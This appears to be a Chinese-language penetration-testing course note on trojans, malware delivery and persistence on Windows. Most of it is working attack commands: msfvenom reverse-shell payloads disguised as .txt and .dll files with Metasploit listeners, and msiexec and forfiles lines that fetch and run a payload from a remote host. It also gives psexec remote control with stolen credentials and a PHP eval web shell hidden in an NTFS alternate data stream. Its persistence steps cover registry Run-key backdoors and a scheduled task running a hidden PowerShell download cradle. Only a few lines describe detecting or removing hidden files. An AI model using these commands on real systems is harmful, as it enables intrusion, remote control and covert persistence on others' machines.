# 渗透测试基础15

# 认识木马程序（运维、文件头与后缀名、协议头、文件合并隐写、使用kali执行其他格式木马-生成txt格式的木马（使用msi来执行）、dll执行法：【dll动态链接库】、forfiles执行【内网】、其他合法方法通过木马执行一些指令【内网执行】-pstools微软官方自带的系统插件、pcalua、zipfldr执行共享程序、权限维持、驱动级的文件隐藏、后门——注册表自启动、计划任务、服务启动）



## 运维：

系统工程师，linux,windows
网络工程师，路由器，交换机，防火墙...
（不会编程）

现在大多数：

自动运维
图形界面



## 当作

**文件头的作用**：
**告诉系统，把下面的二进制代码，当作什么来执行**！！！！

操作系统为了方便用户使用，使用后缀名这个机制：
.exe .dll .jpg .jpeg .png .avi .mp3 .mp4....

查看文件二进制工具：c32



## **协议**：

曾老师协议:
协议头001100->内容1->结束语1111

001100 xxxxxxxxx xxxx xxxx xxxxx 1111

01011101010110101011101010 **001100** 1011010101011010101 **1111** 1010101010110101010101

PE文件(exe程序):
PE头，代码段，函数段，资源段，结尾段



## 文件合并隐写：

有一个Penguins.jpg文件和haha.rar文件



```
cmd

copy Penguins.jpg /a + haha.rar /b xxx.jpg
# 合并为xxx.jpg，既可以用jpg打开（有时候不靠谱），也可以用rar打开
```



或：**用c32**把rar的代码直接复制到jpg文件的最后，保存(**使用二进制的方法进行合并**)

这样就是完整的隐写



## 使用kali执行其他格式木马

木马=干坏事的exe，也可以为其他格式

### 生成txt格式的木马（使用msi来执行）

```
msfvenom -p windows/x64/shell/reverse_tcp lhost=192.168.1.120 lport=4444 -f msi > haha.txt
```

```
msfconsole #监听
use multi/handler
set payload windows/x64/shell/reverse_tcp
show options
set lhost 192.168.1.120
exploit
```

**关于静默安装包=msi**

默认位置：
C:\Windows\System32\msiexec.exe
C:\Windows\SysWOW64\msiexec.exe

**搭建网站后【可用PHPstudy、公网】**

**远程加载木马到电脑运行**

```
cmd:
msiexec /q /i http://192.168.1.252/haha.txt
```



### dll执行法：【dll动态链接库】

```
msfvenom -p windows/x64/shell/reverse_tcp lhost=192.168.1.120 lport=4444 -f dll > haha.dll

msfconsole #监听
use multi/handler
set payload windows/x64/shell/reverse_tcp
show options
set lhost 192.168.1.120
exploit

msiexec /y xxx.dll    # 执行

rundll32.exe shell32.dll,Control_RunDLL ./haha.dll   # 执行方法2
```



### forfiles执行【内网】

默认位置：
C:\Windows\System32\forfiles.exe
C:\Windows\SysWOW64\forfiles.exe

```
forfiles /p c:\windows\system32 /m cmd.exe /c "msiexec /q /i http://192.168.1.252/haha.txt"
```



## 其他合法方法通过木马执行一些指令【内网执行】

###  **pstools微软官方自带的系统插件**：【需要下载解压】

**准备工作：**

1.目标主机防火墙最好关闭！
2.创建/获得对方计算机用户名密码！

**相关操作：**

在pstools命令下打开本机cmd窗口：

```
PsExec.exe \\[目标ip] -u [用户名administrator] -p [密码test123] cmd.exe
```

直接控制对方的cmd

```
psexec \\目标ip -u [目标用户名] -p [密码] cmd.exe
```

控制对方运行自己的b.exe

```
psexec \\目标ip -u [目标用户名] -p [密码] -c c:\b.exe
```

控制对方运行他电脑的a.exe

```
psexec \\目标ip -u [目标用户名] -p [密码] -d c:\a.exe
```

控制对方运行自己的b.exe并且以system权限运行

```
psexec \\目标ip -u [目标用户名] -p [密码] -s -c c:\b.exe
```

以显示的方式运行

```
psexec \\目标ip -u [目标用户名] -p [密码] -i -s -c c:\b.exe
```



### **pcalua** :

让对方cmd远程连接我们自己。

处理情况：
1.当前电脑的硬盘不能用
2.自己权限不高

```
pcalua -m -a \\[自己的ip]\[共享名]
```



### **zipfldr执行共享程序：**

让对方cmd直接执行我们电脑上的程序

```
rundll32.exe zipfldr.dll,RouteTheCall \\[自己的ip]\[共享名]\文件名
```



## 权限维持：

C盘下打开命令行。

利用一句话木马。



**ADS隐藏文件**：

```
echo ^<?php @eval($_POST['cmd']);?^> > index.php:haha.jpg
```

其实生成了一个不可见的index.php和haha.jpg——常规文件管理器、type命令、dir命令、del命令，都找不到haha.jpg



**访问方法**：
进入文件所在的目录

```
notepad index.php:haha.jpg 

或者
dir /r
查看文件信息
```



**如何删除haha.jpg**：
直接删除index.php



## 驱动级的文件隐藏：

http://www.xoslab.com/efl.html 

在这里下载：

![image-20220111150216502](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220111150216502.png)



话外：关于扫描病毒——一个全球化的扫描病毒的网站：

![image-20220111150338982](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220111150338982.png)



下载后打开;

![image-20220111150448798](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220111150448798.png)

然后即可对某些文件的权限进行设置：

![image-20220111150549381](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220111150549381.png)

如果设置为不可读，那么`dir \r`也不能看到



**检查是否碰到了驱动级的文件隐藏**：

如果在相应目录未查到对应文件，但是系统目录存在以下文件：
c:\windows\xlkfs.xxx
(dat,dll,ini,log)

C:\Windows\System32\drivers\xlkfs.sys

说明碰到了驱动级的文件隐藏



**如何清除**：

cmd：

1.查询服务状态 `sc qc xlkfs`
2.停止服务 `net stop xlkfs`
3.删除服务 `sc delete xlkfs`
4.把找到的`xlkfs.xxxx`都删除了



## 后门——注册表自启动：

目录：

```
开机自启动的目录
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
```

```
winlogo/userinit包含初始化的东西

HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

```
或自启动logon script：

HKEY_CURRENT_USER\Environment   #目录下

创建一个字符串值
UserInitMprLogonScript

设置数值数据为
c:\a.exe    # 要执行的东西
```



## 计划任务：

![image-20220111152226518](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220111152226518.png)



```
cmd

schtasks /create /sc minute /mo 1 /tn "haha" /tr "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring(\"\"\"http://192.168.1.252/haha.txt\"\"\"))\""

# 新建一个计划任务haha，打开powershell.exe，去执行......
```



## 服务启动：

```
sc create "nihao" binpath= "cmd /c start mkdir c:\123"  增加一个服务

sc description nihao "hahahahah" 设置服务的描述

sc config nihao start= auto 设置自动启动

net start nihao 开启服务
```



